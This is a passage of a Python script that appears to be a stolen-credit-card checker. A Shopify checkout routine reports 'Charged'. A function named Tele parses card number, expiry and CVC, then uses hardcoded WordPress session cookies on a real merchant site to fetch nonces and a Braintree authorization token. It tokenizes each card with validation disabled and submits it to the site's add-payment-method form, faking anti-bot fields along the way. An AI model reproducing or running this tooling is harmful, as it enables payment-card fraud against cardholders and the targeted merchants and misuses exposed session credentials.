signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}','variables': {'receiptId': 'gid://shopify/ProcessedReceipt/1505710342338','sessionToken': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',},'operationName': 'PollForReceipt',}
	response = r.post('https://wiredministries.com/checkouts/unstable/graphql', params=params, cookies=r.cookies, headers=headers, json=json_data)
	msg=response.text
	if 'Thank you for your order.' in msg or 'successed' in msg or 'Thank you' in msg or 'succeeded' in msg or 'success' in msg or 'Donation successfully completed' in msg or 'successfully' in msg:
	    return 'Charged'
	    
	else:
		mssgg=re.search(r'"code":"(.*?)"', msg).group(1)
		return ''+mssgg+''
	
		
def Tele(ccx):
	import requests
	import re
	import random
	import string
	import base64
	


	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r = requests.session()

	
	cookies = {
    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
    'wp_automatewoo_session_started': '1',
    '__cf_bm': 'MpFvLPcAoZduyWobryIB.sAj961t897_SPHt0ofiE_A-1742703605-1.0.1.1-VmuZAlWHXRHeGIIMrDyhCrk_r5oBXsnYTlr2O6JE7sc4qEJtlW9DFnJJBwHWC.bKvS0wXTyChB8GFKy4P.A2z_62jWQ7h1LG.wcCFMix5Mg',
}
	headers = {
    'authority': 'infinitediscsvipclub.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=MpFvLPcAoZduyWobryIB.sAj961t897_SPHt0ofiE_A-1742703605-1.0.1.1-VmuZAlWHXRHeGIIMrDyhCrk_r5oBXsnYTlr2O6JE7sc4qEJtlW9DFnJJBwHWC.bKvS0wXTyChB8GFKy4P.A2z_62jWQ7h1LG.wcCFMix5Mg',
    'referer': 'https://infinitediscsvipclub.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}	
	response = r.get('https://infinitediscsvipclub.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	print(nonce)
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	print(client)





	cookies = {
    'wordpress_sec_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7Cfe992c987751ab1496ab3efd3a4ca9a9a2cc0cd84c03706f9760dfca210e894d',
    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
    'wp_automatewoo_session_started': '1',
    '__cf_bm': 'xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
}

	headers = {
    'authority': 'infinitediscsvipclub.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'wordpress_sec_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7Cfe992c987751ab1496ab3efd3a4ca9a9a2cc0cd84c03706f9760dfca210e894d; INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
    'origin': 'https://infinitediscsvipclub.com',
    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	
	
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
		
	response = r.post('https://infinitediscsvipclub.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	print(response.json())

	enc = response.json()['data']	
	dec = base64.b64decode(enc).decode('utf-8')
	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	print(auth)






	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'e018c633-5ad4-41f9-87ba-688334a689e1',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	headers = {
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Authorization': f'Bearer {auth}',
    'Braintree-Version': '2018-05-10',
    'Content-Type': 'application/json',
    'Referer': 'https://infinitediscsvipclub.com/',
    'sec-ch-ua-platform': '"Android"',
}
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '86cf8139-6e03-4aad-80e2-f6e39f84fb66',
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)





	cookies = {
    'INGRESSCOOKIE': '1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660',
    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': '65jatlrq4o7x6a018jtw',
    'wp_automatewoo_session_started': '1',
    '__cf_bm': 'xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
}

	
	headers = {
    'authority': 'infinitediscsvipclub.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'INGRESSCOOKIE=1742644246.889.58302.75013|9a02b580b0cdc0e1c8cd4d3e9c8d150e; wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91=achiguuhman44%7C1743853904%7ClgZWs3FUgum29IJXIKxLiRZitmqrdWAlTFtKXxPDc3q%7C751dc03c4632e0053f9b6c054dcd9b148e5e55c0754a2a0c8a38bbc8d2004660; wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91=65jatlrq4o7x6a018jtw; wp_automatewoo_session_started=1; __cf_bm=xxkYQcNP..tuv4waPRa3rYTKrXqGepFR9a6sx3Otre0-1742703949-1.0.1.1-GLwOawM3FW6_VPzXxRit4KANjslvSWnijD2Q0QTbWHrHrz7ffvbarFE6MGhu1c4n6zzyHbZA2j7PpyQNBn2Tjq5s_snKf03Bd1Z8gN2bY8E',
    'origin': 'https://infinitediscsvipclub.com',
    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	
	
	
	
	
	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"58a93dcfd3b55007cc70a82bb3f18c18"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"58a93dcfd3b55007cc70a82bb3f18c18"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
    ('ct_bot_detector_event_token', 'e83dac61bbd5d4abc81fc4529ffcb8372bb3d9142c9903b550360ab222b584e7'),
    ('apbct_visible_fields', 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3Y19icmFpbnRyZWVfcGF5cGFsX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1wYXlwYWwtY29udGV4dCB3Y19icmFpbnRyZWVfcGF5cGFsX2Ftb3VudCB3Y19icmFpbnRyZWVfcGF5cGFsX2N1cnJlbmN5IHdjX2JyYWludHJlZV9wYXlwYWxfbG9jYWxlIHdjLWJyYWludHJlZS1wYXlwYWwtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6MTl9fQ=='),
    ('ct_no_cookie_hidden_field', '_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfYm90X2RldGVjdG9yX2Zvcm1fZXhjbHVzaW9uIjp0cnVlLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2Nvb2tpZXNfdHlwZSI6Im5vbmUiLCJhcGJjdF9oZWFkbGVzcyI6ZmFsc2UsImFwYmN0X3Zpc2libGVfZmllbGRzIjoie1widmlzaWJsZV9maWVsZHNcIjpcIlwiLFwidmlzaWJsZV9maWVsZHNfY291bnRcIjowLFwiaW52aXNpYmxlX2ZpZWxkc1wiOlwid2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLWNhcmQtdHlwZSB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLWVuYWJsZWQgd2MtYnJhaW50cmVlLWNyZWRpdC1jYXJkLTNkLXNlY3VyZS12ZXJpZmllZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLW9yZGVyLXRvdGFsIHdjX2JyYWludHJlZV9jcmVkaXRfY2FyZF9wYXltZW50X25vbmNlIHdjX2JyYWludHJlZV9kZXZpY2VfZGF0YSB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd2NfYnJhaW50cmVlX3BheXBhbF9wYXltZW50X25vbmNlIHdjX2JyYWludHJlZV9kZXZpY2VfZGF0YSB3Yy1icmFpbnRyZWUtcGF5cGFsLWNvbnRleHQgd2NfYnJhaW50cmVlX3BheXBhbF9hbW91bnQgd2NfYnJhaW50cmVlX3BheXBhbF9jdXJyZW5jeSB3Y19icmFpbnRyZWVfcGF5cGFsX2xvY2FsZSB3Yy1icmFpbnRyZWUtcGF5cGFsLXRva2VuaXplLXBheW1lbnQtbWV0aG9kIHdvb2NvbW1lcmNlLWFkZC1wYXltZW50LW1ldGhvZC1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIHdvb2NvbW1lcmNlX2FkZF9wYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gYXBiY3RfdmlzaWJsZV9maWVsZHMgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZFwiLFwiaW52aXNpYmxlX2ZpZWxkc19jb3VudFwiOjIwfSIsImN0X2ZrcF90aW1lc3RhbXAiOjE3NDI3MDQyNTUsImN0X3NjcmVlbl9pbmZvIjoie1wiZnVsbFdpZHRoXCI6MzYwLFwiZnVsbEhlaWdodFwiOjExMjcsXCJ2aXNpYmxlV2lkdGhcIjozNjAsXCJ2aXNpYmxlSGVpZ2h0XCI6NjU0fSIsImN0X2NoZWNranMiOjQyNDk4MjYwOSwiY3RfdGltZXpvbmUiOjUuNSwiY3RfY2hlY2tlZF9lbWFpbHMiOiIwIiwiY3RfaGFzX2tleV91cCI6InRydWUiLCJjdF9wc190aW1lc3RhbXAiOjE3NDI3MDQwNzIsImFwYmN0X3BhZ2VfaGl0cyI6MjEsImN0X2hhc19pbnB1dF9mb2N1c2VkIjoidHJ1ZSIsImN0X3BvaW50ZXJfZGF0YSI6IltdIiwiYXBiY3Rfc2Vzc2lvbl9pZCI6ImRvanhmIiwiYXBiY3RfcHJldl9yZWZlcmVyIjoiaHR0cHM6Ly9pbmZpbml0ZWRpc2NzdmlwY2x1Yi5jb20vbXktYWNjb3VudC9wYXltZW50LW1ldGhvZHMvIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2luZmluaXRlZGlzY3N2aXBjbHViLmNvbS9teS1hY2NvdW